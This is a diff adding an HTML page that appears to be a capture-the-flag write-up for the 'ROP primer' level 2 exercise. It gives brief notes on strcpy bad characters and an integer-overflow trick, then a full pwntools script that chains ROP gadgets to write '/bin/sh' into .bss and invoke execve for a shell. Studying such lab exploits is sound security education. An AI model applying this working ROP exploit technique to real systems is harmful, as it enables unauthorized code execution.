@@ -1,0 +1,130 @@
+<html>
+ <head>
+<title> ROP-2  </title>
+
+ <link rel="stylesheet" type="text/css" href="test1.css" />
+ <link rel="stylesheet" type="text/css" href="fonts.css" />
+</head>
+<style>
+
+      body {background-color:white;
+	border-bottom:1px solid #bfbfbf
+         line-height:1.5em;
+	color:#222}
+ 
+   p{color:black;
+        /*font-style: italic;
+       font-family: "Times New Roman";*/
+      letter-spacing: 2px;
+       font-size: 20px;
+       margin-top: 10px;
+       margin-bottom: 10px;
+        margin-right: 150px;
+       margin-left: 150px; 
+       }
+
+
+
+    h1{ color:black;
+         font-style: italic;
+        font-size:2.2em;
+	font-family:"PT Serif","Georgia","Helvetica Neue",Arial,sans-serif;
+	font-weight:normal;
+	line-height:1.2em;
+	margin-bottom:0.6667em
+        margin-right: 150px;
+       margin-left: 150px;}
+
+code { 
+display: block; white-space: pre-wrap; 
+border: 1px solid #000; 
+padding: 10px; 
+line-height: 1.5em; 
+font-family: "Lucida Console", Monaco, monospace; 
+} 
+.code-str 
+{ color:#ff33d4; } 
+ .code-comment { color:#3c33ff; } 
+ .code-key { color:#9933ff; }
+ .code-brown{color:#ba4a00} 
+
+
+</style>
+<body>
+
+<script src="null.js"></script>
+
+<div style="position: relative; background: url('http://hackerbuck.net23.net/css/bgm.png'); width: 1210px; height: 110px;">
+ <div style="position: absolute; bottom: 0; left: 0.5em; width: 400px; font-weight: bold; color: #fff;">
+ <p style="color:white;font-size:2.2em;"> ROP-2 </p>
+ </div>
+ </div>
+
+
+ <br> <br>  <br>          
+
+<h1 class="post-title"> ROP primer LEVEL2  </h1>
+   
+ <br> 
+
+<p> This one was really tough !! the main problem here is it is using strcpy so u can't use bad chars like /x00,/x0d,/x0a,/x09 so finding gadget was very tough <br>
+     and pack(0) or any single digit number wouldn't work so we have to make use of integer overflow !! we would pack(0xffffffff) first and then increment it to make it zero
+     <br>    </p>
+
+<p><b> NOTE: this binary takes input via command-line argument </b></p>
+
+<br>
+
+<code> 
+from pwn import *
+context.bits=32
+
+
+
+adress1=0x0806fb4c # mov eax,edx ; ret
+adress3=0x08052476 # pop edx
+adress4=0x0805249d  # pop ecx,ebx
+adress6=0x08052476 # pop edx
+adress5=0x08078e71 # mov dword[edx],eax
+                                 
+adress8=0x08083d82 # inc eax
+adress2=0x080c86db # inc ecx
+
+adress9=0x08068973 # inc edx; or al, 0x5D ; ret  ;
+adressx=0x08053728 #  mov eax, 0xFFFFFFFF ; ret  ;  ( a lucky gadget !!)
+
+
+bssadress=0x80ca3e0 
+syscall=0x08052b9f
+
+
+payload= "A"*44
+
+payload+=pack(adress3)+"//bi"  # edx='//bi'
+payload+=pack(adress1)         # eax='//bi'
+
+payload+=pack(adress3)+pack(bssadress) # edx = bss
+
+payload+=pack(adress5)            # [edx]=eax
+
+
+payload+=pack(adress3)+"n/sh"  # edx='n/sh'
+payload+=pack(adress1)         # eax='n/sh'
+
+payload+=pack(adress3)+pack(bssadress+4) # edx = bss
+
+payload+=pack(adress5)            # [edx]=eax
+
+
+payload+=pack(adress6)+pack(0xffffffff)+pack(adress9) # edx=0
+
+payload+=pack(adressx)+pack(adress8)*12   # eax=11
+
+payload+=pack(adress4)+pack(0xffffffff)+pack(bssadress)+pack(adress2) # ecx=0,ebx=(/bin/sh)*
+payload+=pack(syscall)
+
+print payload
+ </code>
+
+</body>
+</html>
